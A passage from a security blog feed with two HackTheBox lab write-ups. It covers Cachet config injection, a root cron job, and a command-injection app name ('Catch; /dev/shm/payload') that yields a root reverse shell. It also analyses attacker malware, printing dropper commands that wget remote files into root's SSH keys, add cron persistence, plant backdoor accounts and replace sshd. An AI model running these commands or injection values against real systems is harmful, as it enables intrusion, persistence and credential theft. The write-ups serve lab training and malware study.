<p><img src="/assets/img/20220317083810.png" alt="" /></p>

<p>Trying this credential in the login page of Cachet instance at <code class="language-plaintext highlighter-rouge">http://catch.htb:8000/auth/login</code>, I was able to log in;</p>

<p><img src="/assets/img/20220317083941.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="cachet-1">Cachet</h3>
<p><br /></p>

<p><em>Cachet</em> has a few vulnerabilities, which are well explained in the blog post https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection. The newline injection vulnerability in the web app immediately caught my attention, as it can be used to override the parameters defined in the configuration file, which is in <code class="language-plaintext highlighter-rouge">.env</code>. Going through the file, the parameter <code class="language-plaintext highlighter-rouge">DB_HOST</code> looks interesting as it defined the address of the backend database to use, which by default is MySQL.</p>

<p>The newline injection can be triggered when updating the <em>mail</em> settings according to the article;</p>

<p><img src="/assets/img/20220317084828.png" alt="" /></p>

<p>Here is a sample of the configuration file;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>APP_ENV=production
APP_DEBUG=false
APP_URL=http://localhost
APP_KEY=SomeRandomString

DB_DRIVER=mysql
DB_HOST=localhost
DB_DATABASE=cachet
DB_USERNAME=homestead
DB_PASSWORD=secret
DB_PORT=null
DB_PREFIX=null

CACHE_DRIVER=file
SESSION_DRIVER=file
QUEUE_DRIVER=sync
CACHET_EMOJI=false

MAIL_DRIVER=smtp
MAIL_HOST=mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ADDRESS=null
MAIL_NAME=null
MAIL_ENCRYPTION=tls
---[snip]---
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Doing a normal update generated the following request;</p>

<p><img src="/assets/img/20220317085558.png" alt="" /></p>

<p>Notice how the parameter names are all submitted in the request as some sort of index key inside the variable <code class="language-plaintext highlighter-rouge">config</code>. This hints at a possible <em>mass assignment</em> vulnerability. So I changed the <code class="language-plaintext highlighter-rouge">config[mail_host]</code> submitted in the request to <code class="language-plaintext highlighter-rouge">config[db_host]</code> and set the value to my IP, then start up metasploit and used the module <code class="language-plaintext highlighter-rouge">auxiliary/server/capture/mysql</code> to capture MySQL handshake, and it worked;</p>

<p><img src="/assets/img/20220317090459.png" alt="" /></p>

<p><img src="/assets/img/20220317090615.png" alt="" /></p>

<p>Forwarding the request, metasploit captured a challenge for the user <code class="language-plaintext highlighter-rouge">will</code>;</p>

<p><img src="/assets/img/20220317090803.png" alt="" /></p>

<p>To my surprise, <code class="language-plaintext highlighter-rouge">john</code> was unable to crack the hash using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, which is the standard for HTB boxes when it comes to crackable passwords;</p>

<p><img src="/assets/img/20220317091207.png" alt="" /></p>

<p>Looking further into the article mentioned above, I learned that <em>Cachet</em> is also vulnerable to configuration leaks. This happens when you supply a parameter name wrapped in <code class="language-plaintext highlighter-rouge">${}</code>, like <code class="language-plaintext highlighter-rouge">${DB_HOST}</code>. Using this, I was able to leak the plain MySQL password by setting the value of the <code class="language-plaintext highlighter-rouge">Mail From Address</code> field to <code class="language-plaintext highlighter-rouge">${DB_PASSWORD}</code>, submitting the request, and reloading the page;</p>

<p><img src="/assets/img/20220317092034.png" alt="" /></p>

<p>This gave me the password;</p>

<p><img src="/assets/img/20220317092131.png" alt="" /></p>

<p>Since metasploit earlier told me the database user is <code class="language-plaintext highlighter-rouge">will</code>, I tested the credential on the SSH service running on the host, and I was able to login;</p>

<p><img src="/assets/img/20220317210917.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">Privesc</h3>
<p><br /></p>

<p>No sudo permission is available for the user <strong>will</strong>. Running LinPEAS also didn’t show anything very interesting at a quick glance. Running <code class="language-plaintext highlighter-rouge">pspy</code> on the host showed something;</p>

<p><img src="/assets/img/20220318062906.png" alt="" /></p>

<p>Going to the <code class="language-plaintext highlighter-rouge">/opt/mdm</code> directory, I found the shell script that’s being run as root;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c">###################</span>
<span class="c"># Signature Check #</span>
<span class="c">###################</span>

sig_check<span class="o">()</span> <span class="o">{</span>
        jarsigner <span class="nt">-verify</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">/</span><span class="nv">$2</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&gt;</span>/dev/null
        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="s1">'[+] Signature Check Passed'</span>
        <span class="k">else
                </span><span class="nb">echo</span> <span class="s1">'[!] Signature Check Failed. Invalid Certificate.'</span>
                cleanup
                <span class="nb">exit
        </span><span class="k">fi</span>
<span class="o">}</span>

<span class="c">#######################</span>
<span class="c"># Compatibility Check #</span>
<span class="c">#######################</span>

comp_check<span class="o">()</span> <span class="o">{</span>
        apktool d <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">/</span><span class="nv">$2</span><span class="s2">"</span> <span class="nt">-o</span> <span class="nv">$3</span> 2&gt;/dev/null <span class="o">&gt;</span>/dev/null
        <span class="nv">COMPILE_SDK_VER</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="nt">-oPm1</span> <span class="s2">"(?&lt;=compileSdkVersion=</span><span class="se">\"</span><span class="s2">)[^</span><span class="se">\"</span><span class="s2">]+"</span> <span class="s2">"</span><span class="nv">$PROCESS_BIN</span><span class="s2">/AndroidManifest.xml"</span><span class="si">)</span>
        <span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$COMPILE_SDK_VER</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="s1">'[!] Failed to find target SDK version.'</span>
                cleanup
                <span class="nb">exit
        </span><span class="k">else
                if</span> <span class="o">[</span> <span class="nv">$COMPILE_SDK_VER</span> <span class="nt">-lt</span> 18 <span class="o">]</span><span class="p">;</span> <span class="k">then
                        </span><span class="nb">echo</span> <span class="s2">"[!] APK Doesn't meet the requirements"</span>
                        cleanup
                        <span class="nb">exit
                </span><span class="k">fi
        fi</span>
<span class="o">}</span>

<span class="c">####################</span>
<span class="c"># Basic App Checks #</span>
<span class="c">####################</span>

app_check<span class="o">()</span> <span class="o">{</span>
        <span class="nv">APP_NAME</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="nt">-oPm1</span> <span class="s2">"(?&lt;=&lt;string name=</span><span class="se">\"</span><span class="s2">app_name</span><span class="se">\"</span><span class="s2">&gt;)[^&lt;]+"</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">/res/values/strings.xml"</span><span class="si">)</span>
        <span class="nb">echo</span> <span class="nv">$APP_NAME</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$APP_NAME</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"Catch"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$APP_NAME</span>|xargs <span class="nt">-I</span> <span class="o">{}</span> sh <span class="nt">-c</span> <span class="s1">'mkdir {}'</span>
                <span class="nb">mv</span> <span class="s2">"</span><span class="nv">$3</span><span class="s2">/</span><span class="nv">$APK_NAME</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">/</span><span class="nv">$APP_NAME</span><span class="s2">/</span><span class="nv">$4</span><span class="s2">"</span>
        <span class="k">else
                </span><span class="nb">echo</span> <span class="s2">"[!] App doesn't belong to Catch Global"</span>
                cleanup
                <span class="nb">exit
        </span><span class="k">fi</span>
<span class="o">}</span>


<span class="c">###########</span>
<span class="c"># Cleanup #</span>
<span class="c">###########</span>

cleanup<span class="o">()</span> <span class="o">{</span>
        <span class="nb">rm</span> <span class="nt">-rf</span> <span class="nv">$PROCESS_BIN</span><span class="p">;</span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="s2">"</span><span class="nv">$DROPBOX</span><span class="s2">/*"</span> <span class="s2">"</span><span class="nv">$IN_FOLDER</span><span class="s2">/*"</span><span class="p">;</span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="si">$(</span><span class="nb">ls</span> <span class="nt">-A</span> /opt/mdm | <span class="nb">grep</span> <span class="nt">-v</span> apk_bin | <span class="nb">grep</span> <span class="nt">-v</span> verify.sh<span class="si">)</span>
<span class="o">}</span>


<span class="c">###################</span>
<span class="c"># MDM CheckerV1.0 #</span>
<span class="c">###################</span>

<span class="nv">DROPBOX</span><span class="o">=</span>/opt/mdm/apk_bin
<span class="nv">IN_FOLDER</span><span class="o">=</span>/root/mdm/apk_bin
<span class="nv">OUT_FOLDER</span><span class="o">=</span>/root/mdm/certified_apps
<span class="nv">PROCESS_BIN</span><span class="o">=</span>/root/mdm/process_bin

<span class="k">for </span>IN_APK_NAME <span class="k">in</span> <span class="nv">$DROPBOX</span>/<span class="k">*</span>.apk<span class="p">;</span><span class="k">do
        </span><span class="nv">OUT_APK_NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">IN_APK_NAME</span><span class="p">##*/</span><span class="k">}</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'.'</span> <span class="nt">-f1</span><span class="si">)</span><span class="s2">_verified.apk"</span>
        <span class="nv">APK_NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>openssl rand <span class="nt">-hex</span> 12<span class="si">)</span><span class="s2">.apk"</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="nt">-L</span> <span class="s2">"</span><span class="nv">$IN_APK_NAME</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">exit
        </span><span class="k">else
                </span><span class="nb">mv</span> <span class="s2">"</span><span class="nv">$IN_APK_NAME</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$IN_FOLDER</span><span class="s2">/</span><span class="nv">$APK_NAME</span><span class="s2">"</span>
        <span class="k">fi
        </span>sig_check <span class="nv">$IN_FOLDER</span> <span class="nv">$APK_NAME</span>
        comp_check <span class="nv">$IN_FOLDER</span> <span class="nv">$APK_NAME</span> <span class="nv">$PROCESS_BIN</span>
        app_check <span class="nv">$PROCESS_BIN</span> <span class="nv">$OUT_FOLDER</span> <span class="nv">$IN_FOLDER</span> <span class="nv">$OUT_APK_NAME</span>
<span class="k">done
</span>cleanup

</pre></td></tr></tbody></table></code></pre></div></div>

<p>After studying the code for a while, I undertood what it does;</p>

<ol>
  <li>Loop over all apk files in the directory <code class="language-plaintext highlighter-rouge">$DROPBOX</code> point to, which is <code class="language-plaintext highlighter-rouge">/opt/mdm/apk_bin</code>. We have write access to this directory.</li>
  <li>Obtain the filename, and remove the <code class="language-plaintext highlighter-rouge">.apk</code> extension in the filename and append <code class="language-plaintext highlighter-rouge">_verified.apk</code></li>
  <li>Generate a 24 character long hex string, which the APK file will be renamed to in the <code class="language-plaintext highlighter-rouge">$DROPBOX</code> directory.</li>
  <li>Verify if the APK is signed  by calling <code class="language-plaintext highlighter-rouge">sig_check()</code>, which uses <code class="language-plaintext highlighter-rouge">jarsigner -verify &lt;apk-file&gt;</code>, and check if the exit code is 0. I doubt we need to worry about this because testing <code class="language-plaintext highlighter-rouge">jarsigner -verify</code> on my machine, even on unsigned APK file, exited with <code class="language-plaintext highlighter-rouge">0</code> exit code, which is what the script is looking for.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">comp_check()</code>, which decompile the APK file using <code class="language-plaintext highlighter-rouge">apktool</code>, and check if the <code class="language-plaintext highlighter-rouge">compileSdkVersion</code> defined in the android manifest is at least <strong>18</strong> using <code class="language-plaintext highlighter-rouge">grep</code>.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">app_check()</code>, which extract the name of the app from <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code> using the key <code class="language-plaintext highlighter-rouge">app_name</code>, ensure that it contains the string <code class="language-plaintext highlighter-rouge">Catch</code>, and pass it in an unsafe way to a shell command that create directory using <code class="language-plaintext highlighter-rouge">mkdir + &lt;app_name&gt;</code>.</li>
</ol>

<p>After some local testing, step <strong>6</strong> appears to be exploitable if we can inject a command in the name of the app we drop into the <code class="language-plaintext highlighter-rouge">/opt/mdm/apk_bin</code> directory. My first attempt was to do this using <code class="language-plaintext highlighter-rouge">apktool</code>. I used the <em>catchv1.0.apk</em> app downloaded earlier from the site. For some reasons, <code class="language-plaintext highlighter-rouge">apktool</code> is unable to compile the decompiled and modified APK, so I started looking for other alternatives.</p>

<p>Since this is a very simple change, as we are only modifying the name of the app, I started looking for android apps that could get the job done, and I found a great one named <strong>APK Editor Pro</strong>. So installed it, and did it on android by;</p>
<ol>
  <li>Loading the apk file</li>
  <li>Selecting the “Full Edit” option</li>
  <li>Selecting the “Decode All Files” option</li>
  <li>Moving to the “Files” tab</li>
  <li>Opening <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code></li>
  <li>Changing line <strong>30</strong> from <code class="language-plaintext highlighter-rouge">&lt;string name="app_name"&gt;Catch&lt;/string&gt;</code> to <code class="language-plaintext highlighter-rouge">&lt;string name="app_name"&gt;Catch; /dev/shm/payload&lt;/string&gt;</code></li>
</ol>

<p>I then rebuit the apk, which saved it as <code class="language-plaintext highlighter-rouge">gen_signed.apk</code>. I copied it over to the web directory on my attack box, and created a file named <code class="language-plaintext highlighter-rouge">payload</code> with my reverse shell. I chose this approach to avoid having characters in the name of the app that may not be allowed.</p>

<p>I SSHed back into the box as <strong>will</strong>, and download the <code class="language-plaintext highlighter-rouge">gen_signed.apk</code> and <code class="language-plaintext highlighter-rouge">payload</code> file to <code class="language-plaintext highlighter-rouge">/dev/shm</code>. I made the payload executable, and moved the APK to <code class="language-plaintext highlighter-rouge">/opt/mdm/apk_bin</code>, and waited for the cron task to process it;</p>

<p><img src="/assets/img/20220318065817.png" alt="" /></p>

<p>After a few seconds, my malicious APK file was processed, and I got a reverse shell on the box as root;</p>

<p><img src="/assets/img/20220318065833.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified port <strong>22</strong>, <strong>80</strong>, <strong>3000</strong> (Gitea), <strong>5000</strong> (Let’s Chat), and <strong>8000</strong> (Cachet) using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Reversed the APK file obtained from the main site, and recovered some tokens.</li>
  <li>One of the tokens gave access to the API of <em>Let’s Chat</em>
    <ul>
      <li>Chat logs obtained using the API revealed a credential for <strong>john</strong></li>
      <li>This credential is reused on the <em>Cachet</em> instance.</li>
    </ul>
  </li>
  <li>Inside <em>Cachet</em> as <strong>john</strong>
    <ul>
      <li>Exploited a <em>mass assignment</em> vulnerability to hijack backend MySQL server used, and capture handshake using <em>metasploit’s</em> <code class="language-plaintext highlighter-rouge">auxiliary/server/capture/mysql</code>. The handshake could not be cracked using <code class="language-plaintext highlighter-rouge">rockyou.txt</code></li>
      <li>Exploited a configuration leak to obtain the plaintext password of the MySQL backend, which gave me access to the box as user <strong>will</strong> over SSH.</li>
    </ul>
  </li>
  <li>Inside the box as <strong>will</strong>
    <ul>
      <li>Identified a cron task running as root that calls <code class="language-plaintext highlighter-rouge">/opt/mdm/verify.sh</code></li>
      <li>This script process APK files in a directory we can write to.</li>
      <li>Studied the code, and built a malicious APK file that exploited a <em>command injection</em> vulnerability in how the name of the app as defined in <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code> is processed, which gave me access to the box as <strong>root</strong></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="api" /><category term="git" /><category term="gitea" /><category term="cachet" /><category term="android" /><category term="apktool" /><category term="reverse engineering" /><category term="custom exploitation" /><category term="cron" /><category term="password reuse" /><summary type="html"><![CDATA[Catch is a very interesting medium-rated linux box on HackTheBox. It starts with some light reversing of an android application to obtain an access token for the Let’s Chat API running on the host. This token will lead you to some credentials in the chat logs, which are reused in the Cachet instance running on the host, which you can exploit to leak the application config and obtain a password that was reused for SSH login. Once inside the box, you will be exploiting a custom cron job that process user controlled files in an unsafe way, leading to code execution as root.]]></summary></entry><entry><title type="html">Undetected - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/undetected.html" rel="alternate" type="text/html" title="Undetected - HackTheBox" /><published>2022-07-02T00:00:00+01:00</published><updated>2022-07-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/undetected</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/undetected.html"><![CDATA[<p><strong>Undetected</strong> is a fun medium linux box that will have you working on the trail of an attacker. Foothold is pretty easy as the site is using a PHP library that allows for RCE. Once on the box, you will need to recover the password of a local user account from a binary that was dropped by the attacker. PrivEsc is through a backdoored SSH daemon (SSHDoor).</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20220221064307.png" alt="" /></p>

<p><img src="/assets/img/20220221064325.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Mon Feb 21 06:45:31 2022 as: nmap -sC -sV -v -oN nmap.txt 10.10.11.146
Nmap scan report for undetected.htb (10.10.11.146)
Host is up (0.50s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Diana's Jewelry

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 06:46:41 2022 -- 1 IP address (1 host up) scanned in 70.26 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/20220221064849.png" alt="" /></p>

<p>The page showed a hostname <code class="language-plaintext highlighter-rouge">djewelry.htb</code>, so I added it to my hosts file. The <strong>store</strong> link points to <code class="language-plaintext highlighter-rouge">store.djewelry.htb</code>.</p>

<p><img src="/assets/img/20220221071736.png" alt="" /></p>

<p>The login page appears to be disabled, and it said to use the contact-us page, which is also not implemented;</p>

<p><img src="/assets/img/20220221071847.png" alt="" /></p>

<p>It does provide an email address <strong>contact@djwelery.htb</strong>. Trying to add an item to the cart also didn’t work;</p>

<p><img src="/assets/img/20220221072344.png" alt="" /></p>

<p>Fuzzing for subdomains using <code class="language-plaintext highlighter-rouge">ffuf</code> didn’t yield anything new. However, fuzzing the web root of <strong>store.djewelry.htb</strong> found a directory that contains PHP libraries;</p>

<p><img src="/assets/img/20220222183424.png" alt="" /></p>

<p>The library <strong>phpunit</strong> has a file at <code class="language-plaintext highlighter-rouge">phpunit/phpunit/src/Util/PHP/eval-stdin.php</code> that, if present, could allow for code execution;</p>

<p><img src="/assets/img/20220222183618.png" alt="" /></p>

<p>This script accepts a POST request, and will execute any PHP code found in the body. Using <code class="language-plaintext highlighter-rouge">curl</code>, I was able to spawn a shell on the box as <code class="language-plaintext highlighter-rouge">www-data</code>;</p>

<p><img src="/assets/img/20220222184401.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>A local user named <strong>steven</strong> exists on the box. The <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file showed something weird;</p>

<p><img src="/assets/img/20220222184724.png" alt="" /></p>

<p>Notice that users <strong>steven</strong> and <strong>steven1</strong> share the same home directory, and have the same UID and GID, which shouldn’t be possible in normal conditions.</p>

<p>Probing the filesystem lead me to an executable binary file at <code class="language-plaintext highlighter-rouge">/var/backups/info</code>, which is an odd place to find an executable. So I copied the file over to my attack box, and opened it up in <code class="language-plaintext highlighter-rouge">radare2</code>.</p>

<p>Dumping the strings contained in the binary, I found a long hex-encoded string;</p>

<p><img src="/assets/img/20220222185224.png" alt="" /></p>

<p>This string decodes to;</p>

<p><img src="/assets/img/20220222185347.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>wget tempfiles.xyz/authorized_keys <span class="nt">-O</span> /root/.ssh/authorized_keys
wget tempfiles.xyz/.main <span class="nt">-O</span> /var/lib/.main
<span class="nb">chmod </span>755 /var/lib/.main
<span class="nb">echo</span> <span class="s2">"* 3 * * * root /var/lib/.main"</span> <span class="o">&gt;&gt;</span> /etc/crontab<span class="p">;</span> <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="se">\'</span><span class="nv">$7</span> <span class="o">==</span> <span class="s2">"/bin/bash"</span> <span class="o">&amp;&amp;</span> <span class="nv">$3</span> <span class="o">&gt;=</span> 1000 <span class="o">{</span>system<span class="o">(</span><span class="s2">"echo "</span><span class="nv">$1</span><span class="s2">"1:</span><span class="se">\\</span><span class="nv">$6</span><span class="se">\\</span><span class="nv">$zS7ykHfFMg3aYht4</span><span class="se">\\</span><span class="nv">$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk</span><span class="s2">.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow"</span><span class="o">)}</span><span class="se">\'</span> /etc/passwd<span class="p">;</span> <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="se">\'</span><span class="nv">$7</span> <span class="o">==</span> <span class="s2">"/bin/bash"</span> <span class="o">&amp;&amp;</span> <span class="nv">$3</span> <span class="o">&gt;=</span> 1000 <span class="o">{</span>system<span class="o">(</span><span class="s2">"echo "</span><span class="nv">$1</span><span class="s2">" "</span><span class="nv">$3</span><span class="s2">" "</span><span class="nv">$6</span><span class="s2">" "</span><span class="nv">$7</span><span class="s2">" &gt; users.txt"</span><span class="o">)}</span><span class="se">\'</span> /etc/passwd
<span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> user group home shell _<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$user</span><span class="s2">"</span>1<span class="s2">":x:</span><span class="nv">$group</span><span class="s2">:</span><span class="nv">$group</span><span class="s2">:,,,:</span><span class="nv">$home</span><span class="s2">:</span><span class="nv">$shell</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /etc/passwd<span class="p">;</span> <span class="k">done</span> &lt; users.txt
<span class="nb">rm </span>users.txt<span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above explains the anormally in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. This is a malware that add a user with the same permissions and home directory as <strong>steven</strong>, but with the username <strong>steven1</strong>, and the password of the given hash.</p>

<p>Using <code class="language-plaintext highlighter-rouge">john</code>, the password hash was cracked successfully;</p>

<p><img src="/assets/img/20220222185825.png" alt="" /></p>

<p>Using the password, I was able to login to the account created;</p>

<p><img src="/assets/img/20220222190000.png" alt="" /></p>

<p>Attempts to view <code class="language-plaintext highlighter-rouge">sudo</code> permissions kept failing due to authentication failures. I am guessing this is because although we supplied the username and password of <strong>steven1</strong>, we were logged in as <strong>steven</strong>;</p>

<p><img src="/assets/img/20220222190217.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Looking through the filesystem, I found an interesting email for <strong>steven</strong>;</p>

<p><img src="/assets/img/20220222190545.png" alt="" /></p>

<p>Looking at the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and the apache configuration files at <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled</code> for anything that points to this new host the site is being moved to didn’t yeild anything. The email did mention some weird behaviour with apache, so I kept looking.</p>

<p>A few files in <code class="language-plaintext highlighter-rouge">/etc/apache2/mods-available</code> stood out based on their modification timestamp;</p>

<p><img src="/assets/img/20220222192533.png" alt="" /></p>

<p>Checking for types using <code class="language-plaintext highlighter-rouge">file *</code>, the file <code class="language-plaintext highlighter-rouge">mod_reader.o</code> stood out as it’s the only executable in the directory;</p>

<p><img src="/assets/img/20220222192709.png" alt="" /></p>

<p>So I copied this file over to my box, and opened it in <code class="language-plaintext highlighter-rouge">radare2</code>;</p>

<p><img src="/assets/img/20220222192812.png" alt="" /></p>

<p>It contains only a few functions and strings. The above base64-encoded string decodes to;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>wget sharefiles.xyz/image.jpeg <span class="nt">-O</span> /usr/sbin/sshd<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="sb">`</span><span class="nb">date</span> +%Y-%m-%d <span class="nt">-r</span> /usr/sbin/a2enmod<span class="sb">`</span> /usr/sbin/ssh
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Looks like the individual exploiting the system dropped a file at <code class="language-plaintext highlighter-rouge">/usr/sbin/sshd</code>, overwriting the SSH server running on the box. They also changed the modification date to match that of <code class="language-plaintext highlighter-rouge">/usr/sbin/a2enmod</code> to avoid detection.</p>

<p>Running the binary, it looks like a normal SSH server;</p>

<p><img src="/assets/img/20220222193611.png" alt="" /></p>

<p>I downloaded this file to my box, and uploaded it to Virus Total to figure out what it is, and <em>Avast</em> flagged it as <strong>SSHDoor</strong>, which is a backdoored SSH server that captures the passwords of users upon authentication, but can also be accessed using a hardcoded key or a password.</p>

<p>The binary has A LOT of strings, and going through them for possible keys or passwords didn’t yield anything. Looking at the function that handles authentication, <code class="language-plaintext highlighter-rouge">auth_password</code>, I found something interesting;</p>

<p><img src="/assets/img/20220222200306.png" alt="" /></p>

<p>This function appears to be decoding a hardcoded string using XOR. My first approach to decoding this string was to run the binary in a debugger and set a breakpoint at that function, but I was unable to run it on my box;</p>

<p><img src="/assets/img/20220222200735.png" alt="" /></p>

<p>So I extracted the bytes to a file. They are 31 characters long;</p>

<p><img src="/assets/img/20220222200948.png" alt="" /></p>

<p>After studying the logic for a while, I was able to implement it in python, and decode the string;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">backdoor</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"backdoor.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="n">scaler</span> <span class="o">=</span> <span class="mh">0xd6</span>
<span class="n">bd_ptr</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">while</span> <span class="p">(</span><span class="n">count</span> <span class="o">!=</span> <span class="mi">31</span><span class="p">):</span>
  <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">30</span><span class="p">:</span>
    <span class="n">nextChar</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="n">nextChar</span> <span class="o">=</span> <span class="n">backdoor</span><span class="p">[</span><span class="n">bd_ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
  <span class="n">decoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">scaler</span> <span class="o">^</span> <span class="mh">0x96</span><span class="p">)</span>
  <span class="n">scaler</span> <span class="o">=</span> <span class="n">nextChar</span>
  <span class="n">bd_ptr</span> <span class="o">+=</span> <span class="mi">1</span>
  <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">decoded</span><span class="p">:</span>
  <span class="n">password</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running the script, I was able to decode the string, which turns out to be the root password used by the backdoor;</p>

<p><img src="/assets/img/20220222201411.png" alt="" /></p>

<p><br /></p>

<hr />
